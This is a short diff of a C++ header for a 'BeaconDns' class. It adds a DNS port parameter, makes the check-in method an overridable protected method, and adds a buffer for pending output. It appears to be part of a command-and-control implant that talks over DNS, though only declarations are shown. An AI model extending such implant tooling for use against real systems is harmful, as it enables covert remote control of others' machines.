@@ -11,11 +11,14 @@ class BeaconDns : public Beacon
 {
 
 public:
-    BeaconDns(std::string& config, const std::string& dnsServer, const std::string& domain);
+    BeaconDns(std::string& config, const std::string& dnsServer,
+              const std::string& domain, int port = 53);
     ~BeaconDns();
 
-private:
-    void checkIn();
+protected:
+    void checkIn() override;
 
+private:
     dns::Client* m_client;
+    std::string m_pendingOutput;
 };
